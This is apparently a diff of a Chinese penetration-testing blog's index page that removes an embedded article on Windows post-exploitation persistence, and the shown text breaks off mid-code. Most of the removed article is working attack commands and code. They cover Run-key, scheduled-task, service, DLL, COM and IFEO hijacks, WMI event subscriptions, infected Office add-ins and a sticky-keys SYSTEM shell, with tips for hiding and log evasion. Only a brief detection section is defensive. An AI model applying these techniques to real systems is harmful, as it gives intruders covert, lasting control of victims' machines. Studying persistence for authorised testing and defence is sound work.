@@ -141,7 +141,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-count">125</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -175,297 +175,6 @@
     </div>
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Post-exploit-persistence-windows/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="YunShang">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="渗透测试实战记录">
-      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 渗透测试实战记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/Post-exploit-persistence-windows/" class="post-title-link" itemprop="url">后渗透：Windows权限维持</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-05-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-05-15T08:00:00+08:00">2025-05-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在渗透测试中，获取目标系统初始访问权限只是第一步。如何长期、稳定地维持控制——即”权限维持”（Persistence）——是后渗透阶段的核心任务。Windows作为企业环境中最常见的平台，提供了丰富的持久化机制，被攻击者广泛利用。本文系统性介绍九种常见Windows权限维持技术，附代码示例及规避建议。</p>
-<p><strong>免责声明：本文所述技术仅供安全研究与授权测试使用，严禁用于非法入侵。使用者需自行承担相应法律责任。</strong></p>
-<hr>
-<h2 id="一、注册表自启动：Run-RunOnce"><a href="#一、注册表自启动：Run-RunOnce" class="headerlink" title="一、注册表自启动：Run &#x2F; RunOnce"></a>一、注册表自启动：Run &#x2F; RunOnce</h2><h3 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h3><p>Windows注册表提供多个”自启动”键值，系统启动或用户登录时自动执行。最常用的是 <code>Run</code> 和 <code>RunOnce</code>：</p>
-<table>
-<thead>
-<tr>
-<th>注册表路径</th>
-<th>触发条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>HKCU\...\CurrentVersion\Run</code></td>
-<td>当前用户登录</td>
-</tr>
-<tr>
-<td><code>HKLM\...\CurrentVersion\Run</code></td>
-<td>所有用户登录（需管理员）</td>
-</tr>
-<tr>
-<td><code>HKCU\...\CurrentVersion\RunOnce</code></td>
-<td>当前用户登录，执行一次</td>
-</tr>
-<tr>
-<td><code>HKLM\...\CurrentVersion\RunOnce</code></td>
-<td>所有用户登录，执行一次</td>
-</tr>
-</tbody></table>
-<h3 id="1-2-代码示例"><a href="#1-2-代码示例" class="headerlink" title="1.2 代码示例"></a>1.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前用户 Run 键</span></span><br><span class="line">reg add <span class="string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v <span class="string">&quot;WindowsUpdate&quot;</span> /t REG_SZ /d <span class="string">&quot;C:\ProgramData\backdoor.exe&quot;</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过PowerShell</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;OneDriveSync&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\ProgramData\sync.exe&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-扩展"><a href="#1-3-扩展" class="headerlink" title="1.3 扩展"></a>1.3 扩展</h3><p>其他冷门启动位置：<code>Policies\Explorer\Run</code>、<code>ShellServiceObjectDelayLoad</code>、<code>RunServicesOnce</code>。攻击者常模仿微软命名（<code>WindowsDefender</code>、<code>SecurityHealth</code>）来混淆。</p>
-<hr>
-<h2 id="二、计划任务持久化（schtasks）"><a href="#二、计划任务持久化（schtasks）" class="headerlink" title="二、计划任务持久化（schtasks）"></a>二、计划任务持久化（schtasks）</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>Windows计划任务支持按时间、事件触发执行，灵活且隐蔽。</p>
-<h3 id="2-2-代码示例"><a href="#2-2-代码示例" class="headerlink" title="2.2 代码示例"></a>2.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统启动时以SYSTEM执行</span></span><br><span class="line">schtasks /create /tn <span class="string">&quot;WindowsUpdateChecker&quot;</span> /tr <span class="string">&quot;C:\ProgramData\update.exe&quot;</span> /<span class="built_in">sc</span> onstart /ru SYSTEM /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户登录时执行PowerShell脚本</span></span><br><span class="line">schtasks /create /tn <span class="string">&quot;AdobeSync&quot;</span> /tr <span class="string">&quot;powershell -WindowStyle Hidden -File C:\Users\Public\sync.ps1&quot;</span> /<span class="built_in">sc</span> onlogon /f</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过PowerShell COM对象创建（更隐蔽）</span></span><br><span class="line"><span class="variable">$action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-Execute</span> <span class="string">&quot;powershell.exe&quot;</span> <span class="literal">-Argument</span> <span class="string">&quot;-EncodedCommand &lt;Base64&gt;&quot;</span></span><br><span class="line"><span class="variable">$trigger</span> = <span class="built_in">New-ScheduledTaskTrigger</span> <span class="literal">-AtStartup</span></span><br><span class="line"><span class="variable">$principal</span> = <span class="built_in">New-ScheduledTaskPrincipal</span> <span class="literal">-UserId</span> <span class="string">&quot;SYSTEM&quot;</span> <span class="literal">-LogonType</span> ServiceAccount</span><br><span class="line"><span class="variable">$settings</span> = <span class="built_in">New-ScheduledTaskSettingsSet</span> <span class="literal">-Hidden</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="string">&quot;SystemMaintenance&quot;</span> <span class="literal">-Action</span> <span class="variable">$action</span> <span class="literal">-Trigger</span> <span class="variable">$trigger</span> <span class="literal">-Principal</span> <span class="variable">$principal</span> <span class="literal">-Settings</span> <span class="variable">$settings</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3-隐藏技巧"><a href="#2-3-隐藏技巧" class="headerlink" title="2.3 隐藏技巧"></a>2.3 隐藏技巧</h3><p>将任务放在 <code>\Microsoft\Windows\</code> 子文件夹；设置SDDL安全描述符限制可见性；通过XML导入绕过命令行日志。</p>
-<hr>
-<h2 id="三、Windows服务持久化"><a href="#三、Windows服务持久化" class="headerlink" title="三、Windows服务持久化"></a>三、Windows服务持久化</h2><h3 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1 原理"></a>3.1 原理</h3><p>Windows服务以SYSTEM权限在后台运行，是理想的持久化载体。可通过创建新服务或将恶意代码以服务DLL方式加载。</p>
-<h3 id="3-2-代码示例"><a href="#3-2-代码示例" class="headerlink" title="3.2 代码示例"></a>3.2 代码示例</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 使用sc命令</span><br><span class="line">sc create &quot;WinFirewallHelper&quot; binPath=&quot;C:\ProgramData\payload.exe&quot; <span class="built_in">start</span>=auto DisplayName=&quot;Windows Firewall Helper Service&quot;</span><br><span class="line">sc <span class="built_in">start</span> &quot;WinFirewallHelper&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过注册表直接创建（无sc日志）</span></span><br><span class="line"><span class="variable">$svc</span> = <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\NetLogonHelper&quot;</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$svc</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$svc</span> <span class="literal">-Name</span> <span class="string">&quot;ImagePath&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\svchost.exe -k netsvcs&quot;</span> <span class="literal">-PropertyType</span> ExpandString <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$svc</span> <span class="literal">-Name</span> <span class="string">&quot;Start&quot;</span> <span class="literal">-Value</span> <span class="number">2</span> <span class="literal">-PropertyType</span> DWord <span class="literal">-Force</span>  <span class="comment"># 2=自动</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$svc</span> <span class="literal">-Name</span> <span class="string">&quot;ServiceDll&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\malicious.dll&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="四、DLL劫持持久化"><a href="#四、DLL劫持持久化" class="headerlink" title="四、DLL劫持持久化"></a>四、DLL劫持持久化</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1 原理"></a>4.1 原理</h3><p>利用Windows DLL搜索顺序缺陷，将恶意DLL放置在目标程序搜索路径靠前的位置。常见手法：搜索顺序劫持、缺失DLL劫持、DLL代理转发。</p>
-<h3 id="4-2-利用步骤"><a href="#4-2-利用步骤" class="headerlink" title="4.2 利用步骤"></a>4.2 利用步骤</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Process Monitor查找缺失DLL：Path contains &quot;.dll&quot; AND Result is &quot;NAME NOT FOUND&quot;</span></span><br><span class="line"><span class="comment"># 常见目标：OneDrive.exe(FileSyncApi.dll)、notepad++.exe(SciLexer.dll)</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp — 恶意DLL模板，转发原始导出以保证程序正常运行</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Payload, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:OriginalFunc=legit.OriginalFunc&quot;</span>)</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-经典目标"><a href="#4-3-经典目标" class="headerlink" title="4.3 经典目标"></a>4.3 经典目标</h3><table>
-<thead>
-<tr>
-<th>目标程序</th>
-<th>劫持DLL</th>
-<th>触发条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>OneDrive.exe</td>
-<td>FileSyncApi.dll</td>
-<td>用户登录自启</td>
-</tr>
-<tr>
-<td>notepad++.exe</td>
-<td>SciLexer.dll</td>
-<td>用户打开</td>
-</tr>
-<tr>
-<td>winscp.exe</td>
-<td>winscp.dll</td>
-<td>用户启动</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="五、COM劫持持久化"><a href="#五、COM劫持持久化" class="headerlink" title="五、COM劫持持久化"></a>五、COM劫持持久化</h2><h3 id="5-1-原理"><a href="#5-1-原理" class="headerlink" title="5.1 原理"></a>5.1 原理</h3><p>COM（组件对象模型）是Windows的核心机制。通过修改注册表中COM对象的CLSID指向恶意DLL，当合法进程（explorer.exe、svchost.exe等）加载该COM对象时，恶意代码由可信进程执行，隐蔽性极高。</p>
-<h3 id="5-2-代码示例"><a href="#5-2-代码示例" class="headerlink" title="5.2 代码示例"></a>5.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$clsid</span> = <span class="string">&quot;&#123;B5F8350B-0548-48B1-A6EE-88BD00B4A5E7&#125;&quot;</span>  <span class="comment"># 目标CLSID</span></span><br><span class="line"><span class="variable">$inprocPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Classes\CLSID\<span class="variable">$clsid</span>\InprocServer32&quot;</span></span><br><span class="line"><span class="variable">$original</span> = (<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$inprocPath</span> <span class="literal">-Name</span> <span class="string">&quot;(default)&quot;</span>).<span class="string">&quot;(default)&quot;</span></span><br><span class="line"><span class="comment"># 备份原始路径</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$inprocPath</span> <span class="literal">-Name</span> <span class="string">&quot;OriginalDll&quot;</span> <span class="literal">-Value</span> <span class="variable">$original</span> <span class="literal">-Force</span></span><br><span class="line"><span class="comment"># 替换为恶意DLL</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$inprocPath</span> <span class="literal">-Name</span> <span class="string">&quot;(default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\ProgramData\evil.dll&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 劫持HKCU路径的COM对象（无需管理员权限）</span></span><br><span class="line"><span class="variable">$targetClsid</span> = <span class="string">&quot;&#123;0F87369F-A4E5-4CFC-BD3E-73E6154572DD&#125;&quot;</span></span><br><span class="line"><span class="variable">$comPath</span> = <span class="string">&quot;HKCU:\Software\Classes\CLSID\<span class="variable">$targetClsid</span>\InprocServer32&quot;</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$comPath</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$comPath</span> <span class="literal">-Name</span> <span class="string">&quot;(default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Users\Public\payload.dll&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$comPath</span> <span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Apartment&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="六、IFEO映像劫持持久化"><a href="#六、IFEO映像劫持持久化" class="headerlink" title="六、IFEO映像劫持持久化"></a>六、IFEO映像劫持持久化</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p>映像文件执行选项（Image File Execution Options，IFEO）是Windows的调试机制。注册表位于 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</code>。为程序设置Debugger键后，目标程序启动时调试器先执行。</p>
-<h3 id="6-2-代码示例"><a href="#6-2-代码示例" class="headerlink" title="6.2 代码示例"></a>6.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 经典劫持 — 当用户启动notepad.exe时执行payload</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;C:\ProgramData\backdoor.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 高级利用：通过GlobalFlag + VerifierDlls加载恶意DLL</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\...\Image File Execution Options\notepad.exe&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;GlobalFlag&quot;</span> <span class="literal">-Value</span> <span class="number">256</span> <span class="literal">-PropertyType</span> DWord <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\...\Image File Execution Options\notepad.exe&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;VerifierDlls&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;evil.dll&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="七、WMI事件订阅持久化"><a href="#七、WMI事件订阅持久化" class="headerlink" title="七、WMI事件订阅持久化"></a>七、WMI事件订阅持久化</h2><h3 id="7-1-原理"><a href="#7-1-原理" class="headerlink" title="7.1 原理"></a>7.1 原理</h3><p>WMI提供永久事件订阅机制，三要素：__EventFilter（触发条件）、__EventConsumer（执行动作）、__FilterToConsumerBinding（绑定）。完全无文件，配置存储在WMI仓库中。</p>
-<h3 id="7-2-代码示例"><a href="#7-2-代码示例" class="headerlink" title="7.2 代码示例"></a>7.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统启动60秒内触发</span></span><br><span class="line"><span class="variable">$filter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysFilter&quot;</span></span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span></span><br><span class="line">    Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 30 AND TargetInstance.SystemUpTime &lt; 90&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$consumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> ActiveScriptEventConsumer <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysConsumer&quot;</span></span><br><span class="line">    ScriptingEngine = <span class="string">&quot;VBScript&quot;</span></span><br><span class="line">    ScriptText = <span class="string">&quot;Set WshShell = CreateObject(&quot;</span><span class="string">&quot;WScript.Shell&quot;</span><span class="string">&quot;) : WshShell.Run &quot;</span><span class="string">&quot;powershell -WindowStyle Hidden -EncodedCommand &lt;Base64&gt;&quot;</span><span class="string">&quot;, 0, False&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$filter</span>; Consumer = <span class="variable">$consumer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 通过mofcomp编译MOF文件实现持久化</span><br><span class="line"># MOF文件定义EventFilter、CommandLineEventConsumer及绑定，编译后写入WMI仓库</span><br><span class="line">mofcomp persistence.mof</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-3-检测与清除"><a href="#7-3-检测与清除" class="headerlink" title="7.3 检测与清除"></a>7.3 检测与清除</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter   <span class="comment"># 列出过滤器</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventConsumer  <span class="comment"># 列出消费者</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-Filter</span> <span class="string">&quot;Name=&#x27;SysFilter&#x27;&quot;</span> | <span class="built_in">Remove-WmiObject</span>  <span class="comment"># 清除</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="八、Office插件持久化"><a href="#八、Office插件持久化" class="headerlink" title="八、Office插件持久化"></a>八、Office插件持久化</h2><h3 id="8-1-原理"><a href="#8-1-原理" class="headerlink" title="8.1 原理"></a>8.1 原理</h3><p>Microsoft Office是企业标配，其插件机制允许在用户打开任意文档时自动加载恶意代码。支持VSTO插件、COM加载项及Normal模板感染。</p>
-<h3 id="8-2-代码示例"><a href="#8-2-代码示例" class="headerlink" title="8.2 代码示例"></a>8.2 代码示例</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册Word COM加载项</span></span><br><span class="line"><span class="variable">$addinPath</span> = <span class="string">&quot;HKCU:\Software\Microsoft\Office\Word\Addins\SecurityAddin&quot;</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$addinPath</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$addinPath</span> <span class="literal">-Name</span> <span class="string">&quot;LoadBehavior&quot;</span> <span class="literal">-Value</span> <span class="number">3</span> <span class="literal">-PropertyType</span> DWord <span class="literal">-Force</span>  <span class="comment"># 3=启动时加载</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$addinPath</span> <span class="literal">-Name</span> <span class="string">&quot;Manifest&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;file:///C:/ProgramData/malicious.vsto&quot;</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27; Normal.dotm 模板感染</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell -WindowStyle Hidden -EncodedCommand &lt;Base64&gt;&quot;, 0, False</span><br><span class="line">End Sub</span><br><span class="line">Sub InfectNormal()</span><br><span class="line">    Application.NormalTemplate.VBProject.VBComponents.Import &quot;C:\ProgramData\payload.bas&quot;</span><br><span class="line">    Application.NormalTemplate.Save</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-3-关键注册表路径"><a href="#8-3-关键注册表路径" class="headerlink" title="8.3 关键注册表路径"></a>8.3 关键注册表路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Office\[版本]\Word\Addins\</span><br><span class="line">HKCU\Software\Microsoft\Office\[版本]\Excel\Addins\</span><br><span class="line">HKCU\Software\Microsoft\Office\[版本]\Outlook\Addins\</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="九、粘滞键（sethc）后门"><a href="#九、粘滞键（sethc）后门" class="headerlink" title="九、粘滞键（sethc）后门"></a>九、粘滞键（sethc）后门</h2><h3 id="9-1-原理"><a href="#9-1-原理" class="headerlink" title="9.1 原理"></a>9.1 原理</h3><p>按5次Shift触发 <code>sethc.exe</code>。通过替换程序或IFEO劫持，可在登录界面获取SYSTEM权限命令行。其他辅助工具：<code>utilman.exe</code>（Win+U）、<code>osk.exe</code>（屏幕键盘）、<code>Magnify.exe</code>（放大镜）。</p>
-<h3 id="9-2-代码示例"><a href="#9-2-代码示例" class="headerlink" title="9.2 代码示例"></a>9.2 代码示例</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:: 方法一：直接替换（需绕过文件保护）</span><br><span class="line">takeown /f C:\Windows\System32\sethc.exe /a</span><br><span class="line">icacls C:\Windows\System32\sethc.exe /grant Administrators:F</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\<span class="built_in">cmd</span>.exe C:\Windows\System32\sethc.exe /y</span><br><span class="line"></span><br><span class="line">:: 方法二：IFEO劫持（推荐，不影响文件完整性）</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;C:\Windows\System32\<span class="built_in">cmd</span>.exe&quot; /f</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一键劫持多个辅助功能</span></span><br><span class="line"><span class="variable">$targets</span> = <span class="selector-tag">@</span>(<span class="string">&quot;sethc.exe&quot;</span>, <span class="string">&quot;utilman.exe&quot;</span>, <span class="string">&quot;osk.exe&quot;</span>, <span class="string">&quot;Magnify.exe&quot;</span>, <span class="string">&quot;Narrator.exe&quot;</span>)</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$t</span> <span class="keyword">in</span> <span class="variable">$targets</span>) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<span class="variable">$t</span>&quot;</span></span><br><span class="line">    <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$key</span> <span 